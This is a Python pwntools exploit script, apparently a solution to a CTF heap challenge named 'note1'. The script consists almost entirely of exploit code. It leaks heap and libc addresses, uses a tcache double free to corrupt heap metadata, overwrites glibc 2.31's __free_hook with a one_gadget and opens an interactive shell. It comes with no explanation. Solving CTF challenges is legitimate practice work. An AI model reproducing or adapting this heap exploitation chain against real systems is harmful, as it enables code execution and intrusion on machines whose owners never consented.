#! /usr/bin/env python3
from pwn import *



# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./note1')
libc = ELF('./libc-2.31.so')
# p = remote('chuj.top', '51429')
p=process('./note1')

# from pwn import *
# from pwnlib.util.iters import mbruteforce
# import itertools
# import base64
#
# p.recvuntil(') == ')
# hash_code = p.recvuntil('\n', drop=True).decode().strip()
# log.success('hash_code={},'.format(hash_code))
#
# charset = string.printable
# proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')
#
# p.sendlineafter('????> ', proof)



def create(index, size, content):
    p.recvuntil('>> ')
    p.sendline('1')

    p.recvuntil('index?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))

    p.recvuntil('size?\n')
    p.recvuntil('>> ')
    p.sendline(str(size))

    p.recvuntil('content?\n')
    p.recvuntil('>> ')
    p.send(content)

def show(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('>> ')
    p.sendline(str(index))

def delete(index):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('>> ')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

create(0,0x60,'123')
create(1,0x60,'456')
create(2,0x60,'789')
# create(3,0x20,'123')


# create(13,0x20,'123')
# create(14,0x20,'123')
# create(15,0x20,'123')
# create(16,0x20,'123')

delete(0)
delete(1)



# leak heap_addr
create(3,0x60,'\x01')

show(3)

heap_addr = u64(p.recvuntil(b'\n',drop = 'True').ljust(8, b'\x00'))
log.success('heap_addr: ' + hex(heap_addr))
tcache_per_data_addr = heap_addr - 0x1f1
log.success('tcache_per_data_addr: ' + hex(tcache_per_data_addr))

create(0,0x60,'123')
create(1,0x60,'123')
create(2,0x60,'123')
create(3,0x60,'123')
create(4,0x60,'123')
create(5,0x60,'123')
create(6,0x60,'123')

create(7,0x60,'123')
create(8,0x60,'123')
create(9,0x60,'123')

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)


delete(7)
delete(8)
delete(7)

# create(10,0x60,p64(tcache_per_data_addr))


create(0,0x60,'1')
create(1,0x60,'1')
create(2,0x60,'1')
create(3,0x60,'1')
create(4,0x60,'1')
create(5,0x60,'1')
create(6,0x60,'1')

create(10,0x60,p64(tcache_per_data_addr))


create(10,0x60,'1')
create(10,0x60,'1')

create(11,0x60,b"\x00"*0x48 + p64(0x0007000000000000))
debug()

create(0,0x40,'1')
create(1,0x40,'1')
create(2,0x40,'1')
create(3,0x40,'1')
create(4,0x40,'1')
create(5,0x40,'1')
create(6,0x40,'1')
create(7,0x40,'1')
create(8,0x40,'1')

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)

delete(7)
delete(8)
delete(7)

create(0,0x40,'1')
create(1,0x40,'1')
create(2,0x40,'1')
create(3,0x40,'1')
create(4,0x40,'1')
create(5,0x40,'1')
create(6,0x40,'1')


delete(11)

show(11)

libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-0x1ebbe0
log.success('libc.address: ' + hex(libc.address))

__free_hook_addr = libc.address + 0x1eeb28
log.success('__free_hook_addr: ' + hex(__free_hook_addr))

one_gadget_addr = libc.address + 0xe6c81
log.success('one_gadget_addr: ' + hex(one_gadget_addr))



create(7,0x40,p64(__free_hook_addr))
create(7,0x40,p64(__free_hook_addr))
create(7,0x40,p64(__free_hook_addr))
create(16,0x40,p64(one_gadget_addr))
# debug()
delete(0)


p.interactive()